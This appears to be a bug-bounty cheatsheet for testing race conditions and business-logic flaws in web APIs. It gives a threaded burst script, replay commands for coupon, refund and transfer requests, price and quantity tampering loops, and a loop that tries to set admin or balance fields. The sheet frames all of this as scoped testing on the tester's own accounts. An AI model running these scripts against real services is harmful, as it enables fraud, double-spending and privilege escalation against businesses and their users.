# Race + Business Logic Cheatsheet: burst orchestration, state-machine batteries, money math

Command set for playbook classes 6 and 15. All races run on YOUR OWN accounts; final-state verification is the verdict (response counts lie, state does not). Money-movement claims stay bounded at the provider boundary.

## 1. Sequential truth first (the control)

```bash
# single-request baseline: what the flow does with zero concurrency
curl -s 'https://<TARGET>/api/v1/coupon/apply' -H 'Authorization: Bearer <A-TOKEN>' \
  -H 'Content-Type: application/json' -d '{"code": "WELCOME10"}' | python3 -m json.tool
# verify final state (balance, coupon count, receipt list):
curl -s 'https://<TARGET>/api/v1/me/wallet' -H 'Authorization: Bearer <A-TOKEN>' | python3 -m json.tool
```

Record: 1 request -> 1 success -> state delta X. Everything is measured against this.

## 2. The synchronized burst (barrier release)

```python
# race_burst.py - N concurrent requests released on a barrier, transcripts saved
import http.client, json, ssl, threading, time, sys

HOST, PATH, TOKEN, BODY, N, OUT = "<TARGET>", "/api/v1/coupon/apply", "<A-TOKEN>", '{"code":"WELCOME10"}', int(sys.argv[1]) if len(sys.argv) > 1 else 20, "evidence"
barrier = threading.Barrier(N)
ctx = ssl.create_default_context()
results = []
lock = threading.Lock()

def worker(i):
    barrier.wait()                      # synchronized start
    conn = http.client.HTTPSConnection(HOST, 443, context=ctx, timeout=30)
    t0 = time.time()
    try:
        conn.request("POST", PATH, body=BODY, headers={
            "Host": HOST, "Authorization": f"Bearer {TOKEN}",
            "Content-Type": "application/json", "Content-Length": str(len(BODY))})
        r = conn.getresponse()
        body = r.read()
        with lock: results.append((i, r.status, len(body), round(time.time() - t0, 2)))
    except Exception as e:
        with lock: results.append((i, "ERR", str(e)[:60], 0))
    finally: conn.close()

threads = [threading.Thread(target=worker, args=(i,)) for i in range(N)]
[t.start() for t in threads]; [t.join() for t in threads]
with open(f"{OUT}/race_burst_N{N}.txt", "w") as f:
    for row in sorted(results): f.write(str(row) + "\n")
ok = sum(1 for r in results if r[1] == 200)
print(f"burst N={N}: {ok} x 200 / {N} requests")
```

Compare against the sequential truth: N successes where 1 is correct is the finding. Last-byte sync variant (advanced): release after the request bytes are written, only the response awaited - use when the server serializes on connection establishment.

## 3. Final-state verification (the actual verdict)

```bash
# after the burst: read state with a FRESH session and count
curl -s 'https://<TARGET>/api/v1/me/wallet' -H 'Authorization: Bearer <A-TOKEN>' | python3 -m json.tool
curl -s 'https://<TARGET>/api/v1/me/coupons' -H 'Authorization: Bearer <A-TOKEN>' | python3 -c "import json,sys; d=json.load(sys.stdin); print('coupons:', len(d.get('data', d)))"
# email receipt count (your own inbox, tempmail):
# (count receipts for the burst order in the tempmail MCP)
```

Record the delta: sequential (1 credit) vs burst (N credits). Balance delta, coupon count, receipt count - the measured numbers go in the Impact block.

## 4. Idempotency check

```bash
# absent / client-controlled / reusable:
curl -sv -X POST 'https://<TARGET>/api/v1/transfer' -H 'Authorization: Bearer <A-TOKEN>' \
  -H 'Content-Type: application/json' -H 'Idempotency-Key: BB-key-001' \
  -d '{"amount": 1, "to": "<B-ACCOUNT-ID>"}' 2>&1 | grep -E '< HTTP|idempot'
# replay the SAME key:
curl -sv -X POST 'https://<TARGET>/api/v1/transfer' -H 'Authorization: Bearer <A-TOKEN>' \
  -H 'Content-Type: application/json' -H 'Idempotency-Key: BB-key-001' \
  -d '{"amount": 1, "to": "<B-ACCOUNT-ID>"}' 2>&1 | grep '< HTTP'
# no key + server-side dedup on a natural key (order id) = honest boundary; no key + no dedup = repeatable
```

## 5. State-machine batteries (skip / repeat / reorder)

```bash
# SKIP: call step 3 of a 3-step flow directly (session state from step 1 only)
curl -sv -X POST 'https://<TARGET>/api/v1/checkout/confirm' -H 'Authorization: Bearer <A-TOKEN>' \
  -H 'Content-Type: application/json' -d '{"cart_id": "<CART>", "payment_method_id": "<PM>"}' 2>&1 | grep '< HTTP'
# REPEAT: replay the same step's request+response pair (refund/claim/issue twice)
curl -sv -X POST 'https://<TARGET>/api/v1/refund' -H 'Authorization: Bearer <A-TOKEN>' \
  -H 'Content-Type: application/json' -d '{"order_id": "<OWN-ORDER>"}' 2>&1 | grep '< HTTP'
# (then the same call again -> 200 twice = repeatable step)
# REORDER: swap the natural order of sibling endpoints (withdraw before kyc, publish before approve)
```

## 6. Value batteries (negative / zero / swap / overflow)

```bash
for body in \
  '{"quantity": -1}' \
  '{"quantity": 0}' \
  '{"amount": 0.001}' \
  '{"amount": 99999999999}' \
  '{"price": 100, "currency": "IDR"}' \
  '{"price": 100, "currency": "USD"}'; do
  printf '%s -> ' "$body"
  curl -s -o /dev/null -w '%{http_code}\n' -X POST 'https://<TARGET>/api/v1/cart/item' \
    -H 'Authorization: Bearer <A-TOKEN>' -H 'Content-Type: application/json' -d "$body"
done
# client-price trust check: modify the price field the client sends, watch the settlement amount
curl -sv -X POST 'https://<TARGET>/api/v1/checkout' -H 'Authorization: Bearer <A-TOKEN>' \
  -H 'Content-Type: application/json' -d '{"items": [{"sku": "<SKU>", "qty": 1, "price": 1}]}' 2>&1 | grep -E '< HTTP|total|amount'
```

Client-side price accepted at settlement (cart shows X, checkout charges the tampered Y) = the e-commerce classic; complete to the payment-provider boundary and stop (the state differential is the proof, never move real money).

## 7. Mass-assignment battery

```bash
for field in role isAdmin is_paid is_admin approved balance amount status tier verified; do
  printf '%s -> ' "$field"
  curl -s -o /dev/null -w '%{http_code}\n' -X PUT 'https://<TARGET>/api/v1/me' \
    -H 'Authorization: Bearer <A-TOKEN>' -H 'Content-Type: application/json' \
    -d "{\"$field\": true}"
done
# read back what stuck:
curl -s 'https://<TARGET>/api/v1/me' -H 'Authorization: Bearer <A-TOKEN>' | python3 -m json.tool | grep -iE 'role|admin|paid|approved|balance|status'
```

Any field that stuck AND elevated the account = the finding; fields that stuck without effect = note (silent-discard vs accept-and-ignore tells you the framework).

## 8. Cross-account variants (gift / transfer / credit races)

```bash
# A sends credits to B while A's own balance is spent concurrently (two burst groups):
# group 1: N x transfer A->B ; group 2: N x transfer A->C  (all your own accounts)
# verdict: B's total received > A's initial balance = double-spend across accounts
```

## 9. Monetary cap math (the Impact closer)

```python
# from the measured burst result:
per_burst = N_successes - 1          # extra credits per burst
bursts_per_day = 24 * 60 / 5         # at the observed pacing, conservative
cap = per_burst * bursts_per_day
print(f"monetary cap: {cap} x unit-value per account per day, measured from N={N_successes}")
```

The number, with its arithmetic shown, is what the Impact block carries.
